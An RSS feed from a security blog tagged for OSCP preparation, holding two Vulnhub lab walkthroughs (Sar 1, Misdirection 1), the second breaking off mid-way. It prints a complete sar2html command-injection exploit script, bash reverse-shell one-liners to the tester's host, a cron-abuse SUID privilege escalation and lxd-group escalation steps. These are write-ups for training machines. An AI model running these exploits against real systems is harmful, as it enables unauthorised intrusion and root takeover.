<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>OSCP Prep on ikuamike</title>
    <link>https://blog.ikuamike.io/tags/oscp-prep/</link>
    <description>Recent content in OSCP Prep on ikuamike</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>© Michael Ikua</copyright>
    <lastBuildDate>Thu, 13 May 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.ikuamike.io/tags/oscp-prep/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Vulnhub: Sar 1</title>
      <link>https://blog.ikuamike.io/posts/2021/sar1/</link>
      <pubDate>Thu, 13 May 2021 00:00:00 +0000</pubDate>
      
      <guid>https://blog.ikuamike.io/posts/2021/sar1/</guid>
      <description></description>
      <content>&lt;img src=&#34;https://blog.ikuamike.io/img/sar1/sar1.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Difficulty&lt;/th&gt;
&lt;th&gt;Release Date&lt;/th&gt;
&lt;th&gt;Author&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Beginner&lt;/td&gt;
&lt;td&gt;15 Feb 2020&lt;/td&gt;
&lt;td&gt;Love&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
&lt;p&gt;In this box there&amp;rsquo;s only one port open that is running a vulnerable version of sar2html that
we take advantage of to get a low priv shell. For privilege escalation there was a cron job
running as root that was running a script we could write in.&lt;/p&gt;
&lt;h1 id=&#34;reconnaissance&#34;&gt;Reconnaissance&lt;/h1&gt;
&lt;p&gt;Nmap&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 192.168.56.107
Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.000040s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;65534&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
MAC Address: 08:00:27:48:00:F5 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
&lt;h2 id=&#34;80-http&#34;&gt;80 (HTTP)&lt;/h2&gt;
&lt;p&gt;Using nmap scripts we see the existence of robots.txt&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 192.168.56.107
Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.00042s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
| http-enum:
|   /robots.txt: Robots file
|_  /phpinfo.php: Possible information file
|_http-server-header: Apache/2.4.29 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|_http-title: Apache2 Ubuntu Default Page: It works
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From this we discover sar2HTML.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/sar1/sar1-01.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Visiting this directory I get the version of sar2html as 3.2.1.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/sar1/sar1-02.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Checking on searchsploit, a remote command execution vulnerability exists for this version.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;searchsploit sar2html
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/sar1/sar1-03.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;shell-as-user&#34;&gt;Shell as user&lt;/h1&gt;
&lt;p&gt;By executing the python script that exploits this RCE vulnerability, we are able to get a reverse shell.&lt;/p&gt;
&lt;p&gt;script url: &lt;a href=&#34;https://www.exploit-db.com/exploits/49344&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.exploit-db.com/exploits/49344&lt;/a&gt;

&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;~/Vulnhub/Sar1  python3 49344.py

Enter The url =&amp;gt; http://192.168.56.107/sar2HTML/
Command =&amp;gt; id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

Command =&amp;gt; /bin/bash+-c+&#39;/bin/bash+-i+&amp;gt;%26+/dev/tcp/192.168.56.1/9000+0&amp;gt;%261&#39;
&lt;/code&gt;&lt;/pre&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/sar1/sar1-04.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Performing some enumeration to achieve some privilege escalation to root or lateral movement to other users
I found a cron job running as root.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/sar1/sar1-05.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;While we can&amp;rsquo;t write to this file, the script being executed inside it is writeable.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/sar1/sar1-06.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;shell-as-root&#34;&gt;Shell as root&lt;/h1&gt;
&lt;p&gt;By writing into write.sh using vi, we can escalate our privileges.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/bin/sh

cp /bin/bash /var/www/html/suidbash
chmod u+s /var/www/html/suidbash
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This will create a copy of the bash binary and add suid permissions to it.&lt;/p&gt;
&lt;p&gt;Once the cron job executes and creates the binary we can achieve a root shell and read all the flags.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/sar1/sar1-07.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;extras&#34;&gt;Extras&lt;/h1&gt;
&lt;p&gt;Understanding the exploit script and perform the exploit manually.&lt;/p&gt;
&lt;p&gt;To my surprise, this exploit code was created by a good friend of mine, Musyoka Ian.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Exploit Title: sar2html 3.2.1 - &amp;#39;plot&amp;#39; Remote Code Execution&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# Date: 27-12-2020&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# Exploit Author: Musyoka Ian&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# Vendor Homepage:https://github.com/cemtan/sar2html&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# Software Link: https://sourceforge.net/projects/sar2html/&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# Version: 3.2.1&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# Tested on: Ubuntu 18.04.1&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; requests
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; re
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; cmd &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Cmd

url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Enter The url =&amp;gt; &amp;#34;&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Terminal&lt;/span&gt;(Cmd):
    prompt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Command =&amp;gt; &amp;#34;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;default&lt;/span&gt;(self, args):
        exploiter(args)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;exploiter&lt;/span&gt;(cmd):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;global&lt;/span&gt; url
    sess &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;session()
    output &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sess&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(f&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{url}/index.php?plot=;{cmd}&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
        out &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; re&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;findall(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;option value=(.*?)&amp;gt;&amp;#34;&lt;/span&gt;, output&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;text)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt; (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Error!!&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ouut &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; out:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;There is no defined host...&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; ouut:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;null selected&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; ouut:
                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;selected&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; ouut:
                    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt; (ouut)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt; ()

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;):
    terminal &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Terminal()
    terminal&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;cmdloop()&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;According to the script the vulnerable parameter is plot and simply takes in our command and executes it.&lt;/p&gt;
&lt;p&gt;When interacting with the application you can select OS, when you pick one the plot parameter is used.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/sar1/sar1-08.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Here we can inject the command we want and execute shell commands. The OS option doesn&amp;rsquo;t matter, anything after
the semi-colon &lt;code&gt;;&lt;/code&gt; will be executed. For the reverse shell command remember to url encode special chars like I did
above&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/sar1/sar1-09.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Shoutout to Musyoka Ian, you can read his blog linked below. He does cool writeups on challenges as well.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://musyokaian.medium.com/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://musyokaian.medium.com/&lt;/a&gt;

&lt;/p&gt;</content>
    </item>
    
    <item>
      <title>Vulnub: Misdirection 1</title>
      <link>https://blog.ikuamike.io/posts/2021/misdirection1/</link>
      <pubDate>Wed, 21 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>https://blog.ikuamike.io/posts/2021/misdirection1/</guid>
      <description></description>
      <content>&lt;img src=&#34;https://blog.ikuamike.io/img/misdirection1/misdirection.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Difficulty&lt;/th&gt;
&lt;th&gt;Release Date&lt;/th&gt;
&lt;th&gt;Author&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Beginner&lt;/td&gt;
&lt;td&gt;24 Sep 2019&lt;/td&gt;
&lt;td&gt;FalconSpy&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;summary&#34;&gt;Summary&lt;/h2&gt;
&lt;p&gt;For this box, initial access was a web shell discovered. Then with low priv shell we could run bash as brexit user
and were able to pivot to that account. Once we are brexit user, we abuse his membership to the lxd to start a
privileged container that can read and write the whole file system by mounting it in the container.&lt;/p&gt;
&lt;h2 id=&#34;reconnaissance&#34;&gt;Reconnaissance&lt;/h2&gt;
&lt;p&gt;Nmap&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 192.168.191.136
Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.00032s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;65531&lt;/span&gt; closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu Linux; protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
80/tcp   open  http    Rocket httpd 1.2.6 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Python 2.7.15rc1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
3306/tcp open  mysql   MySQL &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;unauthorized&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
8080/tcp open  http    Apache httpd 2.4.29 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h2&gt;
&lt;h3 id=&#34;8080-http&#34;&gt;8080 (HTTP)&lt;/h3&gt;
&lt;p&gt;Nmap&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Nmap 7.91 scan initiated Wed Apr 14 06:31:44 2021 as: nmap -n -Pn -sV -p 8080 --script default,http-enum,http-shellshock,http-backup-finder,http-config-backup --append-output -oN recon-misdirection1/misdirection1-8080-httpnmap.enum 192.168.191.136&lt;/span&gt;
Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 192.168.191.136
Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.00026s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.29 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
| http-enum:
|   /wordpress/: Blog
|   /wordpress/wp-login.php: Wordpress login page.
|   /css/: Potentially interesting directory w/ listing on &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span&gt;
|   /debug/: Potentially interesting folder
|   /development/: Potentially interesting directory w/ listing on &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span&gt;
|   /help/: Potentially interesting directory w/ listing on &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span&gt;
|   /images/: Potentially interesting directory w/ listing on &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span&gt;
|   /js/: Potentially interesting directory w/ listing on &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span&gt;
|   /manual/: Potentially interesting directory w/ listing on &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span&gt;
|_  /scripts/: Potentially interesting directory w/ listing on &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span&gt;
|_http-server-header: Apache/2.4.29 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|_http-title: Apache2 Ubuntu Default Page: It works
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ffuf&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ffuf -ic -c -u http://192.168.191.136:8080/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;js                      &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 301, Size: 322, Words: 20, Lines: 10&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
help                    &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 301, Size: 324, Words: 20, Lines: 10&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
wordpress               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 301, Size: 329, Words: 20, Lines: 10&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
manual                  &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 301, Size: 326, Words: 20, Lines: 10&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
debug                   &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 301, Size: 325, Words: 20, Lines: 10&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
development             &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 301, Size: 331, Words: 20, Lines: 10&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
shell                   &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 301, Size: 325, Words: 20, Lines: 10&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
images                  &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 301, Size: 326, Words: 20, Lines: 10&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
css                     &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 301, Size: 323, Words: 20, Lines: 10&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
scripts                 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 301, Size: 327, Words: 20, Lines: 10&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
server-status           &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 403, Size: 305, Words: 22, Lines: 12&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
                        &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 200, Size: 10918, Words: 3499, Lines: 376&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After some directory bruteforcing on both port 80 and 8080 I discovered several directories. On port 8080 the debug directory
contains a web shell.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/misdirection1/misdirection-1.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;shell-as-www-data&#34;&gt;Shell as www-data&lt;/h2&gt;
&lt;p&gt;Supplying the following command we are able to get a reverse shell.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;bash -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.191.1/9000 0&amp;gt;&amp;amp;1 &amp;amp;&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;shell:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/misdirection1/misdirection-2.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;After some basic enumeration we discover www-data has sudo permissions to run /bin/bash as brexit user without
any password requirement.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/misdirection1/misdirection-3.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;shell-as-brexit&#34;&gt;Shell as brexit&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;sudo -u brexit /bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/misdirection1/misdirection-4.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;On running id we see that brexit is in the lxd group and no images are present.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/misdirection1/misdirection-10.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;shell-as-root&#34;&gt;Shell as root&lt;/h2&gt;
&lt;p&gt;Brexit being in the lxd group allows for privilege escalation. First we need to add am image then create a container.&lt;/p&gt;
&lt;p&gt;First we need to get distrobuilder, the compile it. This uses go to compile therefore you need go to be installed.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;wget https://github.com/lxc/distrobuilder/archive/refs/tags/distrobuilder-1.2.zip
7z x distrobuilder-1.2.zip
cd distrobuilder-distrobuilder-1.2 
make
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You can use go get as the repo instructions recommend but for me it didn&amp;rsquo;t work as expected.&lt;/p&gt;
&lt;p&gt;With distrobuilder ready, download the alpine image yaml file to build a small alpine image for lxd&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then run distrobuilder with the alpine yaml file as below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;sudo ~/bin/distrobuilder build-lxd alpine.yaml -o image.release&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;3.8
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This will result in two files: lxd.tar.xz and rootfs.squashfs.&lt;/p&gt;
&lt;p&gt;We then need to transfer this two files to our victim for privesc.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# on kali&lt;/span&gt;

python3 -m http.server

&lt;span style=&#34;color:#75715e&#34;&gt;# on victim&lt;/span&gt;

wget 192.168.191.1:8000/lxd.tar.xz
wget 192.168.191.1:8000/rootfs.squashfs
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/misdirection1/misdirection-5.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;After adding the image we need to run lxd init and can keep everything default.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;lxd init
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/misdirection1/misdirection-7.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


